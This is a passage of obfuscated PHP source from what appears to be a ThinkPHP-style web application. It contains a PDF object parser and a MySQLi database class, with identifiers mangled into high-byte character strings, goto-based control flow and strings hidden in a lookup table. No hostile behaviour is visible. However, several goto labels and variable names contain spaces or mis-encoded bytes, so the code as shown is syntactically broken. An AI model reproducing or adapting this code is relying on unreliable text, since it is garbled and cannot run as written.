$E¢°è†…Á‚[$BÃÜçè‰“Ã[1503]][$BÃÜçè‰“Ã[363]] = array(); $E¢°è†…Á‚[$BÃÜçè‰“Ã[1503]][$BÃÜçè‰“Ã[363]][0] = $eæèâ³’Ğä[1]; $E¢°è†…Á‚[$BÃÜçè‰“Ã[1503]][$BÃÜçè‰“Ã[363]][1] = $eæèâ³’Ğä[2]; } if (!$E¢°è†…Á‚[$BÃÜçè‰“Ã[1503]][$BÃÜçè‰“Ã[1172]]) { return !1; } goto FÂÎ……Ú…¦; bïËÙ„ÌÎÄ: $BÃÜçè‰“Ã =& $_SERVER[»„]; $b¤¸˜¢£‹¾ = $bå¡É—ÒËÁ[$BÃÜçè‰“Ã[1502]]; $E¢°è†…Á‚ = array($BÃÜçè‰“Ã[1503] => array(), $BÃÜçè‰“Ã[1522] => array()); goto fÜ‚É”µÏò; FŒ²µ’ÏĞğ: foreach ($eæèâ³’Ğä[3] as $EÁ‚÷Şò÷â => $D¬ø˜·‹¼¸) { if ($eæèâ³’Ğä[3][$EÁ‚÷Şò÷â] == $BÃÜçè‰“Ã[1525]) { $c·ß­æ‡î„ = $Fè‹µ²«ô¿ . $BÃÜçè‰“Ã[70] . intval($eæèâ³’Ğä[2][$EÁ‚÷Şò÷â]); $E¢°è†…Á‚[$BÃÜçè‰“Ã[1522]][$c·ß­æ‡î„] = intval($eæèâ³’Ğä[1][$EÁ‚÷Şò÷â]); ++$Fè‹µ²«ô¿; } else { if ($eæèâ³’Ğä[3][$EÁ‚÷Şò÷â] == $BÃÜçè‰“Ã[1526]) { ++$Fè‹µ²«ô¿; } else { } } } if (preg_match_all($BÃÜçè‰“Ã[1527], $b¤¸˜¢£‹¾, $eæèâ³’Ğä)) { $bÕÇ‹‹îÛ = $bå¡É—ÒËÁ[$BÃÜçè‰“Ã[77]] - $bå¡É—ÒËÁ[$BÃÜçè‰“Ã[1500]]; foreach ($eæèâ³’Ğä[0] as $EÁ‚÷Şò÷â => $C¬İôßÈ²) { $C¡ŒôßİĞ· = $eæèâ³’Ğä[1][$EÁ‚÷Şò÷â] . $BÃÜçè‰“Ã[70] . $eæèâ³’Ğä[2][$EÁ‚÷Şò÷â]; $E¢°è†…Á‚[$BÃÜçè‰“Ã[1522]][$C¡ŒôßİĞ·] = strpos($b¤¸˜¢£‹¾, $C¬İôßÈ²) + $bÕÇ‹‹îÛ + 1; } } if (preg_match_all($BÃÜçè‰“Ã[1528], $b¤¸˜¢£‹¾, $eæèâ³’Ğä)) { $c†Éâ’§Şí = count($eæèâ³’Ğä[1]) == 1 ? $eæèâ³’Ğä[1][0] : $eæèâ³’Ğä[1][1]; } else { $c†Éâ’§Şí = substr($b¤¸˜¢£‹¾, -1024 * 5); } goto c‹ÑìĞïã; f«çŒØÏ‰×: if ($bå¡É—ÒËÁ[$BÃÜçè‰“Ã[77]] - $a½àÄê¶¶ß > $bå¡É—ÒËÁ[$BÃÜçè‰“Ã[1500]]) { $FßßÄùÈ–ã = 4 * $bå¡É—ÒËÁ[$BÃÜçè‰“Ã[1500]]; $bå¡É—ÒËÁ[$BÃÜçè‰“Ã[1500]] = $FßßÄùÈ–ã; $bå¡É—ÒËÁ[$BÃÜçè‰“Ã[1501]] = StreamWrapperIO::read($bå¡É—ÒËÁ[$BÃÜçè‰“Ã[75]], 0, $FßßÄùÈ–ã); $bå¡É—ÒËÁ[$BÃÜçè‰“Ã[1502]] = StreamWrapperIO::read($bå¡É—ÒËÁ[$BÃÜçè‰“Ã[75]], $bå¡É—ÒËÁ[$BÃÜçè‰“Ã[77]] - $FßßÄùÈ–ã, $FßßÄùÈ–ã); $b¤¸˜¢£‹¾ = $bå¡É—ÒËÁ[$BÃÜçè‰“Ã[1502]]; } $Fè‹µ²«ô¿ = 0; preg_match_all($BÃÜçè‰“Ã[1524], $b¤¸˜¢£‹¾, $eæèâ³’Ğä); goto FŒ²µ’ÏĞğ; FÂÎ……Ú…¦: if (preg_match($BÃÜçè‰“Ã[1536], $c†Éâ’§Şí, $eæèâ³’Ğä) > 0) { } return $E¢°è†…Á‚; goto Aª­æ¿ãĞ°; Aª­æ¿ãĞ°: } private static function getObjectValue($Cè´¹Ğæ¡ù, $CÉãğ˜Šô¹, $A—Ÿ¼İËÒ) { goto AÒ‚ŒŞì¦Š; AÒ‚ŒŞì¦Š: $FØöŠ©³á“ =& $_SERVER[»„]; $CÀˆÀëë”Ü = self::getObject($Cè´¹Ğæ¡ù, $CÉãğ˜Šô¹[$FØöŠ©³á“[1522]][$A—Ÿ¼İËÒ]); if (is_string($CÀˆÀëë”Ü[1])) { return $CÀˆÀëë”Ü[1]; } goto a¥ŞÄÒÄºÍ; a¥ŞÄÒÄºÍ: if (!is_array($CÀˆÀëë”Ü[1])) { return array(); } $E´ÄÁ©¿Î = array(); for ($f‚½ºç‚ˆ = 0; $f‚½ºç‚ˆ < count($CÀˆÀëë”Ü[1]); $f‚½ºç‚ˆ += 2) { $eŞª´˜ÄŒ = $CÀˆÀëë”Ü[1][$f‚½ºç‚ˆ]; $bš±èŒÈâ = $CÀˆÀëë”Ü[1][$f‚½ºç‚ˆ + 1]; if (count($eŞª´˜ÄŒ) == 3 && $eŞª´˜ÄŒ[0] == $FØöŠ©³á“[8]) { $fË†àÃÛ = !1; if ($bš±èŒÈâ[0] == $FØöŠ©³á“[1537]) { $bš±èŒÈâ = self::getObject($Cè´¹Ğæ¡ù, $CÉãğ˜Šô¹[$FØöŠ©³á“[1522]][$bš±èŒÈâ[1]]); } $fË†àÃÛ = $bš±èŒÈâ[1]; if ($fË†àÃÛ === !1) { continue; } if (is_string($fË†àÃÛ)) { $fË†àÃÛ = self::decodeStr($fË†àÃÛ); } $E´ÄÁ©¿Î[$eŞª´˜ÄŒ[1]] = $fË†àÃÛ; } } goto d½Ìô®µæ¾; d½Ìô®µæ¾: return $E´ÄÁ©¿Î; goto FÜÒŠÅèÕ„; FÜÒŠÅèÕ„: } private static function getObject($E©·³§¿‹å, $eğŠí¶æê§) { $DÆí©ÑäèÚ = self::getObjectItem($E©·³§¿‹å, $eğŠí¶æê§); $DÆí©ÑäèÚ = self::getObjectItem($E©·³§¿‹å, $DÆí©ÑäèÚ[2]); return $DÆí©ÑäèÚ; } private static function getObjectItem($dùæ¶ÃõÉÈ, $EÔØŒãÎ) { goto EµÄì—¯ˆ‡; CÏ»êïÆ§ : $bÔíéİùğ = $EÔØŒãÎ >= $D­‰²•»Áƒ ? $EÔØŒãÎ - $D­‰²•»Áƒ : $EÔØŒãÎ; $E¯¦‚è¿‘Ê = $EÔØŒãÎ >= $D­‰²•»Áƒ ? $dùæ¶ÃõÉÈ[$DÔåõ¡êĞ[1502]] : $dùæ¶ÃõÉÈ[$DÔåõ¡êĞ[1501]]; if ($EÔØŒãÎ > $cèË‹¡¶í && $EÔØŒãÎ <= $D­‰²•»Áƒ) { $bÔíéİùğ = 0; $E¯¦‚è¿‘Ê = StreamWrapperIO::read($dùæ¶ÃõÉÈ[$DÔåõ¡êĞ[75]], $EÔØŒãÎ, $cèË‹¡¶í); } goto A Í±ºÇ‘©; A Í±ºÇ‘©: $Aá–…±ÄÕ = self::getRawObject($E¯¦‚è¿‘Ê, $bÔíéİùğ); if ($EÔØŒãÎ >= $D­‰²•»Áƒ) { $Aá–…±ÄÕ[2] = $Aá–…±ÄÕ[2] + $D­‰²•»Áƒ; } else { if ($EÔØŒãÎ > $cèË‹¡¶í && $EÔØŒãÎ <= $D­‰²•»Áƒ) { $Aá–…±ÄÕ[2] = $Aá–…±ÄÕ[2] + $EÔØŒãÎ; } } return $Aá–…±ÄÕ; goto FùŠÇÙÜ§; EµÄì—¯ˆ‡: $DÔåõ¡êĞ =& $_SERVER[»„]; $cèË‹¡¶í = $dùæ¶ÃõÉÈ[$DÔåõ¡êĞ[1500]]; $D­‰²•»Áƒ = $dùæ¶ÃõÉÈ[$DÔåõ¡êĞ[77]] - $cèË‹¡¶í; goto CÏ»êïÆ§ ; FùŠÇÙÜ§: } private static function decodeStr($FÂÖÛ™´Ş) { goto B¥®ˆóÚÒ; B¥®ˆóÚÒ: $FÍˆáÂ¢” =& $_SERVER[»„]; $FÂÖÛ™´Ş = str_replace(array($FÍˆáÂ¢”[1538], $FÍˆáÂ¢”[1539], $FÍˆáÂ¢”[1540], $FÍˆáÂ¢”[1541], $FÍˆáÂ¢”[1542], $FÍˆáÂ¢”[1543], $FÍˆáÂ¢”[1544], $FÍˆáÂ¢”[1545]), array($FÍˆáÂ¢”[93], $FÍˆáÂ¢”[50], $FÍˆáÂ¢”[8], $FÍˆáÂ¢”[244], $FÍˆáÂ¢”[807], $FÍˆáÂ¢”[213], $FÍˆáÂ¢”[980], $FÍˆáÂ¢”[326]), $FÂÖÛ™´Ş); $DµÁ¦İß…ñ = preg_split($FÍˆáÂ¢”[1546], $FÂÖÛ™´Ş, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto a„Ç‰¨´Š; F¼ï¶ÒÒ¤†: $FÂÖÛ™´Ş = $FÍˆáÂ¢”[33]; foreach ($DµÁ¦İß…ñ as $C•éØ«î¾í) { if (preg_match($FÍˆáÂ¢”[1549], $C•éØ«î¾í)) { $FÂÖÛ™´Ş .= \chr(hexdec(trim($C•éØ«î¾í, $FÍˆáÂ¢”[1550]))); } else { $FÂÖÛ™´Ş .= $C•éØ«î¾í; } } $DµÁ¦İß…ñ = preg_split($FÍˆáÂ¢”[1551], $FÂÖÛ™´Ş, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Aõ‰Ø„ãÂæ; aƒ½š¹ÈùÑ: return $FÂÖÛ™´Ş; goto B¼¹á¢ÏÑõ; a„Ç‰¨´Š: $FÂÖÛ™´Ş = $FÍˆáÂ¢”[33]; foreach ($DµÁ¦İß…ñ as $C•éØ«î¾í) { if (preg_match($FÍˆáÂ¢”[1547], $C•éØ«î¾í)) { $FÂÖÛ™´Ş .= \chr(octdec(trim($C•éØ«î¾í, $FÍˆáÂ¢”[93]))); } else { $FÂÖÛ™´Ş .= $C•éØ«î¾í; } } $DµÁ¦İß…ñ = preg_split($FÍˆáÂ¢”[1548], $FÂÖÛ™´Ş, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto F¼ï¶ÒÒ¤†; Aõ‰Ø„ãÂæ: $FÂÖÛ™´Ş = $FÍˆáÂ¢”[33]; foreach ($DµÁ¦İß…ñ as $C•éØ«î¾í) { if (preg_match($FÍˆáÂ¢”[1552], $C•éØ«î¾í) && !1 === stripos($C•éØ«î¾í, $FÍˆáÂ¢”[1553])) { $C•éØ«î¾í = preg_replace($FÍˆáÂ¢”[1554], $FÍˆáÂ¢”[33], $C•éØ«î¾í); $C•éØ«î¾í = trim($C•éØ«î¾í, $FÍˆáÂ¢”[916]); $C•éØ«î¾í = pack($FÍˆáÂ¢”[1555], $C•éØ«î¾í); $FÂÖÛ™´Ş .= $C•éØ«î¾í; } else { $FÂÖÛ™´Ş .= $C•éØ«î¾í; } } if (preg_match($FÍˆáÂ¢”[1556], $FÂÖÛ™´Ş)) { $bâøø†­Ó• = substr($FÂÖÛ™´Ş, 2); $FÂÖÛ™´Ş = $FÍˆáÂ¢”[33]; $EôŒá¥íñ¨ = strlen($bâøø†­Ó•); for ($fÍğíè‘®‹ = 0; $fÍğíè‘®‹ < $EôŒá¥íñ¨; $fÍğíè‘®‹ += 2) { $BÅ¸×•†’ƒ = hexdec(bin2hex(substr($bâøø†­Ó•, $fÍğíè‘®‹, 2))); $FÂÖÛ™´Ş .= mb_convert_encoding($FÍˆáÂ¢”[1557] . intval($BÅ¸×•†’ƒ) . $FÍˆáÂ¢”[67], $FÍˆáÂ¢”[1558], $FÍˆáÂ¢”[1559]); } } goto aƒ½š¹ÈùÑ; B¼¹á¢ÏÑõ: } private static function getRawObject($EÁó¬øŸï£, $cÖáø¨ğ» = 0) { goto DØÁãÈ®Âã; Bëæ‹¸Æ³: return array($DŠ’­¹çÂŞ, $Aº…øßç½, $cÖáø¨ğ»); goto E†×™é—è; cÓàªŒÁ—Š: $cÖáø¨ğ» += strspn($EÁó¬øŸï£, $A²¤Ê«Ñ[1560], $cÖáø¨ğ»); $DºÄ„Ûå‚Ÿ = $EÁó¬øŸï£[$cÖáø¨ğ»]; switch ($DºÄ„Ûå‚Ÿ) { case $A²¤Ê«Ñ[1561]: $a÷¿ŸñŞ»ò = strcspn($EÁó¬øŸï£, $A²¤Ê«Ñ[1562], $cÖáø¨ğ»); if ($a÷¿ŸñŞ»ò > 0) { $cÖáø¨ğ» += $a÷¿ŸñŞ»ò; return self::getRawObject($EÁó¬øŸï£, $cÖáø¨ğ»); } break; case $A²¤Ê«Ñ[8]: $DŠ’­¹çÂŞ = $DºÄ„Ûå‚Ÿ; ++$cÖáø¨ğ»; $Bé‰Üâ¡©ã = preg_match($A²¤Ê«Ñ[1563], substr($EÁó¬øŸï£, $cÖáø¨ğ», 256), $dÚéììï); if (1 == $Bé‰Üâ¡©ã) { $Aº…øßç½ = $dÚéììï[1]; $cÖáø¨ğ» += strlen($Aº…øßç½); } break; case $A²¤Ê«Ñ[244]: case $A²¤Ê«Ñ[807]: $DŠ’­¹çÂŞ = $DºÄ„Ûå‚Ÿ; ++$cÖáø¨ğ»; $B³§ƒƒ¥ñ = $cÖáø¨ğ»; if ($A²¤Ê«Ñ[244] == $DºÄ„Ûå‚Ÿ) { $D‡·ì•ªÊ‚ = 1; while ($D‡·ì•ªÊ‚ > 0) { if (!isset($EÁó¬øŸï£[$B³§ƒƒ¥ñ])) { break; } $f”ÚùÑµˆ³ = $EÁó¬øŸï£[$B³§ƒƒ¥ñ]; switch ($f”ÚùÑµˆ³) { case $A²¤Ê«Ñ[93]: ++$B³§ƒƒ¥ñ; break; case $A²¤Ê«Ñ[244]: ++$D‡·ì•ªÊ‚; break; case $A²¤Ê«Ñ[807]: --$D‡·ì•ªÊ‚; break; } ++$B³§ƒƒ¥ñ; } $Aº…øßç½ = substr($EÁó¬øŸï£, $cÖáø¨ğ», $B³§ƒƒ¥ñ - $cÖáø¨ğ» - 1); $cÖáø¨ğ» = $B³§ƒƒ¥ñ; } break; case $A²¤Ê«Ñ[153]: case $A²¤Ê«Ñ[472]: $DŠ’­¹çÂŞ = $DºÄ„Ûå‚Ÿ; ++$cÖáø¨ğ»; if ($A²¤Ê«Ñ[153] == $DºÄ„Ûå‚Ÿ) { $Aº…øßç½ = array(); do { $AÛŠ‡îÊö = $cÖáø¨ğ»; $bŠ·­ÖñÑî = self::getRawObject($EÁó¬øŸï£, $cÖáø¨ğ»); $cÖáø¨ğ» = $bŠ·­ÖñÑî[2]; $Aº…øßç½[] = $bŠ·­ÖñÑî; } while ($A²¤Ê«Ñ[472] != $bŠ·­ÖñÑî[0] && $cÖáø¨ğ» != $AÛŠ‡îÊö); array_pop($Aº…øßç½); } break; case $A²¤Ê«Ñ[915]: case $A²¤Ê«Ñ[918]: if (isset($EÁó¬øŸï£[$cÖáø¨ğ» + 1]) && $EÁó¬øŸï£[$cÖáø¨ğ» + 1] == $DºÄ„Ûå‚Ÿ) { $DŠ’­¹çÂŞ = $DºÄ„Ûå‚Ÿ . $DºÄ„Ûå‚Ÿ; $cÖáø¨ğ» += 2; if ($A²¤Ê«Ñ[915] == $DºÄ„Ûå‚Ÿ) { $Aº…øßç½ = array(); do { $AÛŠ‡îÊö = $cÖáø¨ğ»; $bŠ·­ÖñÑî = self::getRawObject($EÁó¬øŸï£, $cÖáø¨ğ»); $cÖáø¨ğ» = $bŠ·­ÖñÑî[2]; $Aº…øßç½[] = $bŠ·­ÖñÑî; } while ($A²¤Ê«Ñ[1564] != $bŠ·­ÖñÑî[0] && $cÖáø¨ğ» != $AÛŠ‡îÊö); array_pop($Aº…øßç½); } } else { $DŠ’­¹çÂŞ = $DºÄ„Ûå‚Ÿ; ++$cÖáø¨ğ»; $Bé‰Üâ¡©ã = preg_match($A²¤Ê«Ñ[1565], substr($EÁó¬øŸï£, $cÖáø¨ğ»), $dÚéììï); if ($A²¤Ê«Ñ[915] == $DºÄ„Ûå‚Ÿ && 1 == $Bé‰Üâ¡©ã) { $Aº…øßç½ = strtr($dÚéììï[1], $A²¤Ê«Ñ[1566], $A²¤Ê«Ñ[33]); $cÖáø¨ğ» += \strlen($dÚéììï[0]); } elseif (!1 !== ($fÅâŸˆˆÎ = strpos($EÁó¬øŸï£, $A²¤Ê«Ñ[918], $cÖáø¨ğ»))) { $cÖáø¨ğ» = $fÅâŸˆˆÎ + 1; } } break; default: if ($A²¤Ê«Ñ[1567] == substr($EÁó¬øŸï£, $cÖáø¨ğ», 6)) { $DŠ’­¹çÂŞ = $A²¤Ê«Ñ[1567]; $cÖáø¨ğ» += 6; } elseif ($A²¤Ê«Ñ[99] == substr($EÁó¬øŸï£, $cÖáø¨ğ», 4)) { $DŠ’­¹çÂŞ = $A²¤Ê«Ñ[99]; $cÖáø¨ğ» += 4; $Aº…øßç½ = $A²¤Ê«Ñ[99]; } elseif ($A²¤Ê«Ñ[1568] == substr($EÁó¬øŸï£, $cÖáø¨ğ», 4)) { $DŠ’­¹çÂŞ = $A²¤Ê«Ñ[1569]; $cÖáø¨ğ» += 4; $Aº…øßç½ = $A²¤Ê«Ñ[1568]; } elseif ($A²¤Ê«Ñ[1570] == substr($EÁó¬øŸï£, $cÖáø¨ğ», 5)) { $DŠ’­¹çÂŞ = $A²¤Ê«Ñ[1569]; $cÖáø¨ğ» += 5; $Aº…øßç½ = $A²¤Ê«Ñ[1570]; } elseif ($A²¤Ê«Ñ[1571] == substr($EÁó¬øŸï£, $cÖáø¨ğ», 6)) { $DŠ’­¹çÂŞ = $A²¤Ê«Ñ[1571]; $cÖáø¨ğ» += 6; if (1 == preg_match($A²¤Ê«Ñ[1572], substr($EÁó¬øŸï£, $cÖáø¨ğ»), $dÚéììï)) { $cÖáø¨ğ» += strlen($dÚéììï[0]); $a¼ìÀ¡‡ä± = $A²¤Ê«Ñ[1573]; $Bé‰Üâ¡©ã = preg_match($a¼ìÀ¡‡ä±, substr($EÁó¬øŸï£, $cÖáø¨ğ»), $dÚéììï, PREG_OFFSET_CAPTURE); if (1 == $Bé‰Üâ¡©ã) { $Aº…øßç½ = substr($EÁó¬øŸï£, $cÖáø¨ğ», $dÚéììï[0][1]); $cÖáø¨ğ» += $dÚéììï[1][1]; } } } elseif ($A²¤Ê«Ñ[1574] == substr($EÁó¬øŸï£, $cÖáø¨ğ», 9)) { $DŠ’­¹çÂŞ = $A²¤Ê«Ñ[1574]; $cÖáø¨ğ» += 9; } elseif (1 == preg_match($A²¤Ê«Ñ[1575], substr($EÁó¬øŸï£, $cÖáø¨ğ», 33), $dÚéììï)) { $DŠ’­¹çÂŞ = $A²¤Ê«Ñ[1537]; $cÖáø¨ğ» += strlen($dÚéììï[0]); $Aº…øßç½ = intval($dÚéììï[1]) . $A²¤Ê«Ñ[70] . intval($dÚéììï[2]); } elseif (1 == preg_match($A²¤Ê«Ñ[1576], substr($EÁó¬øŸï£, $cÖáø¨ğ», 33), $dÚéììï)) { $DŠ’­¹çÂŞ = $A²¤Ê«Ñ[1577]; $Aº…øßç½ = intval($dÚéììï[1]) . $A²¤Ê«Ñ[70] . intval($dÚéììï[2]); $cÖáø¨ğ» += strlen($dÚéììï[0]); } elseif (($AÈ ¦ˆÓĞù = strspn($EÁó¬øŸï£, $A²¤Ê«Ñ[1578], $cÖáø¨ğ»)) > 0) { $DŠ’­¹çÂŞ = $A²¤Ê«Ñ[1579]; $Aº…øßç½ = substr($EÁó¬øŸï£, $cÖáø¨ğ», $AÈ ¦ˆÓĞù); $cÖáø¨ğ» += $AÈ ¦ˆÓĞù; } break; } goto Bëæ‹¸Æ³; DØÁãÈ®Âã: $A²¤Ê«Ñ =& $_SERVER[»„]; $DŠ’­¹çÂŞ = $A²¤Ê«Ñ[33]; $Aº…øßç½ = $A²¤Ê«Ñ[33]; goto cÓàªŒÁ—Š; E†×™é—è: } } goto EŸ ·Ï¤; dãŸƒ¥¤ˆÜ: class DbMysqli extends Db { public function __construct($D™•Ü¿ù© = '') { $D†±†ï©Ûï =& $_SERVER[»„]; if (!extension_loaded($D†±†ï©Ûï[715])) { think_exception(think_lang($D†±†ï©Ûï[10]) . $D†±†ï©Ûï[815]); } if (!empty($D™•Ü¿ù©)) { $this->config = $D™•Ü¿ù©; if (empty($this->config[$D†±†ï©Ûï[13]])) { $this->config[$D†±†ï©Ûï[13]] = $D†±†ï©Ûï[33]; } } } public function connect($aÓÁÚÛÜ£Â = '', $BÌœ–¥‚³‘ = 0) { $cˆÈë‰Æï§ =& $_SERVER[»„]; if (!isset($this->linkID[$BÌœ–¥‚³‘])) { goto EŞ»×§Ô Ñ; eå§¶°©ç…: $this->connected = !0; if (1 != think_config($cˆÈë‰Æï§[18])) { unset($this->config); } goto Bö¨Ï·òÀˆ; E»ª‚†Ã‰¬: $A¹È±Ü £Ë = $this->linkID[$BÌœ–¥‚³‘]->server_version; $this->linkID[$BÌœ–¥‚³‘]->query($cˆÈë‰Æï§[793] . think_config($cˆÈë‰Æï§[794]) . $cˆÈë‰Æï§[55]); if ($A¹È±Ü £Ë > $cˆÈë‰Æï§[795]) { $this->linkID[$BÌœ–¥‚³‘]->query($cˆÈë‰Æï§[796]); } goto eå§¶°©ç…; EŞ»×§Ô Ñ: if (empty($aÓÁÚÛÜ£Â)) { $aÓÁÚÛÜ£Â = $this->config; } $this->linkID[$BÌœ–¥‚³‘] = new mysqli($aÓÁÚÛÜ£Â[$cˆÈë‰Æï§[789]], $aÓÁÚÛÜ£Â[$cˆÈë‰Æï§[791]], $aÓÁÚÛÜ£Â[$cˆÈë‰Æï§[792]], $aÓÁÚÛÜ£Â[$cˆÈë‰Æï§[17]], $aÓÁÚÛÜ£Â[$cˆÈë‰Æï§[790]] ? intval($aÓÁÚÛÜ£Â[$cˆÈë‰Æï§[790]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto E»ª‚†Ã‰¬; Bö¨Ï·òÀˆ: } return $this->linkID[$BÌœ–¥‚³‘]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($a÷˜²ôº«á) { goto c‹£Ôé•Ì; fº…ÊÂ‰æ¢: think_status($c‰ì‘î¦ùª[20]); $this->queryID = $this->_linkID->query($a÷˜²ôº«á); if ($this->_linkID->more_results()) { while (($d×ë¬êŠ = $this->_linkID->next_result()) != NULL) { $d×ë¬êŠ->free_result(); } } goto A•´¨ù§í; c‹£Ôé•Ì: $c‰ì‘î¦ùª =& $_SERVER[»„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EĞÜä³‚ÕÒ; EĞÜä³‚ÕÒ: $this->queryStr = $a÷˜²ôº«á; if ($this->queryID) { $this->free(); } think_action_status($c‰ì‘î¦ùª[19], 1); goto fº…ÊÂ‰æ¢; A•´¨ù§í: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto dÛ¯æ„™İò; dÛ¯æ„™İò: } public function execute($Aè•ÒŒÑÉÑ) { goto DÅŞÃÔÏ¨¿; DÅŞÃÔÏ¨¿: $BÓù»İ‰±ô =& $_SERVER[»„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bòºìÂ³ÉÓ; bòºìÂ³ÉÓ: $this->queryStr = $Aè•ÒŒÑÉÑ; if ($this->queryID) { $this->free(); } think_action_status($BÓù»İ‰±ô[21], 1); goto BÒŠ…ªœ§Ç; c¦‰„“·³: if (!1 === $a”ôÜâëšî) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto f¢èÄóË; BÒŠ…ªœ§Ç: think_status($BÓù»İ‰±ô[20]); $a”ôÜâëšî = $this->_linkID->query($Aè•ÒŒÑÉÑ); $this->debug(); goto c¦‰„“·³; f¢èÄóË: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aîè‰„Ô¡ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aîè‰„Ô¡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aµò¿ ó• = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Aµò¿ ó•) { $this->error(); return !1; } } return !0; } private function getAll() { $F³²ï„øŒ = array(); if ($this->numRows > 0) { for ($fÆÏ¼²¨¸á = 0; $fÆÏ¼²¨¸á < $this->numRows; $fÆÏ¼²¨¸á++) { $F³²ï„øŒ[$fÆÏ¼²¨¸á] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $F³²ï„øŒ; } public function getFields($dŒ‘Ÿ½‡õØ) { $BöÀ÷–ØÔö =& $_SERVER[»„]; $dø”ë‰¥š¿ = $this->query($BöÀ÷–ØÔö[800] . $this->parseKey($dŒ‘Ÿ½‡õØ)); $Aó¢§Ôòğø = array(); if ($dø”ë‰¥š¿) { foreach ($dø”ë‰¥š¿ as $dñóš²»…æ => $F¶«ÂÄßöä) { $Aó¢§Ôòğø[$F¶«ÂÄßöä[$BöÀ÷–ØÔö[27]]] = array($BöÀ÷–ØÔö[28] => $F¶«ÂÄßöä[$BöÀ÷–ØÔö[27]], $BöÀ÷–ØÔö[29] => $F¶«ÂÄßöä[$BöÀ÷–ØÔö[30]], $BöÀ÷–ØÔö[31] => (bool) ($F¶«ÂÄßöä[$BöÀ÷–ØÔö[32]] === $BöÀ÷–ØÔö[33]), $BöÀ÷–ØÔö[34] => $F¶«ÂÄßöä[$BöÀ÷–ØÔö[35]], $BöÀ÷–ØÔö[36] => strtolower($F¶«ÂÄßöä[$BöÀ÷–ØÔö[37]]) == $BöÀ÷–ØÔö[38], $BöÀ÷–ØÔö[39] => strtolower($F¶«ÂÄßöä[$BöÀ÷–ØÔö[40]]) == $BöÀ÷–ØÔö[41]); } } return $Aó¢§Ôòğø; } public function getTables($aÊ¸Í¬¡¯ = '') { $dˆÆÀ‚§© =& $_SERVER[»„]; $b±º®êãõÑ = !empty($aÊ¸Í¬¡¯) ? $dˆÆÀ‚§©[802] . $aÊ¸Í¬¡¯ : $dˆÆÀ‚§©[803]; $Bİ½‹ˆäìé = $this->query($b±º®êãõÑ); $CÊÊíŠÓŞ = array(); if ($Bİ½‹ˆäìé) { foreach ($Bİ½‹ˆäìé as $E›ìöç‚˜ => $fˆì’†å›÷) { $CÊÊíŠÓŞ[$E›ìöç‚˜] = current($fˆì’†å›÷); } } return $CÊÊíŠÓŞ; } public function replace($BÌŸğÕï¯ë, $E¯å÷¤¶ = array()) { $fÛø“äˆší =& $_SERVER[»„]; foreach ($BÌŸğÕï¯ë as $D„õç‡Ã“ => $bÏ±š‡ŒöÍ) { $D¨’ğ¡‚‰µ = $this->parseValue($bÏ±š‡ŒöÍ); if (is_scalar($D¨’ğ¡‚‰µ)) { $aë¶åæ«î[] = $D¨’ğ¡‚‰µ; $fÉÚ‡à¢–Û[] = $this->parseKey($D„õç‡Ã“); } } $A©«Ê¥“Üï = $fÛø“äˆší[804] . $this->parseTable($E¯å÷¤¶[$fÛø“äˆší[263]]) . $fÛø“äˆší[805] . implode($fÛø“äˆší[47], $fÉÚ‡à¢–Û) . $fÛø“äˆší[806] . implode($fÛø“äˆší[47], $aë¶åæ«î) . $fÛø“äˆší[807]; return $this->execute($A©«Ê¥“Üï); } public function insertAll($c·øÎ‡¾ò, $FóõğÌ¾ä¥ = array(), $D¨£Š§Šƒ¸ = false) { goto eÄ¬ŠÁ¡öÊ; bÛ÷¾äŸŒê: $Añ§ÆŞ¬†Ÿ = array(); foreach ($c·øÎ‡¾ò as $C‚àä…–­) { $BÉ„×®šøÛ = array(); foreach ($C‚àä…–­ as $E¨²Ó½„Ë => $A“˜„®´£±) { $A“˜„®´£± = $this->parseValue($A“˜„®´£±); if (is_scalar($A“˜„®´£±)) { $BÉ„×®šøÛ[] = $A“˜„®´£±; } } $Añ§ÆŞ¬†Ÿ[] = $cÅ÷¸É”Êà[244] . implode($cÅ÷¸É”Êà[47], $BÉ„×®šøÛ) . $cÅ÷¸É”Êà[807]; } array_walk($f¸’‘®¤Ëâ, array($this, $cÅ÷¸É”Êà[808])); goto BÕåÍ’Â‘; eÄ¬ŠÁ¡öÊ: $cÅ÷¸É”Êà =& $_SERVER[»„]; if (!is_array($c·øÎ‡¾ò[0])) { return !1; } $f¸’‘®¤Ëâ = array_keys($c·øÎ‡¾ò[0]); goto bÛ÷¾äŸŒê; BÕåÍ’Â‘: $aàÜ„Û”›´ = ($D¨£Š§Šƒ¸ ? $cÅ÷¸É”Êà[809] : $cÅ÷¸É”Êà[810]) . $cÅ÷¸É”Êà[811] . $this->parseTable($FóõğÌ¾ä¥[$cÅ÷¸É”Êà[263]]) . $cÅ÷¸É”Êà[805] . implode($cÅ÷¸É”Êà[47], $f¸’‘®¤Ëâ) . $cÅ÷¸É”Êà[812] . implode($cÅ÷¸É”Êà[47], $Añ§ÆŞ¬†Ÿ); return $this->execute($aàÜ„Û”›´); goto C’“‰·ãÇ›; C’“‰·ãÇ›: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E»¯’ÊÈñ‡ =& $_SERVER[»„]; $this->error = $this->_linkID->errno . $E»¯’ÊÈñ‡[4] . $this->_linkID->error; if ($E»¯’ÊÈñ‡[33] != $this->queryStr) { $this->error .= LNG($E»¯’ÊÈñ‡[45]) . $this->queryStr; } think_trace($this->error, 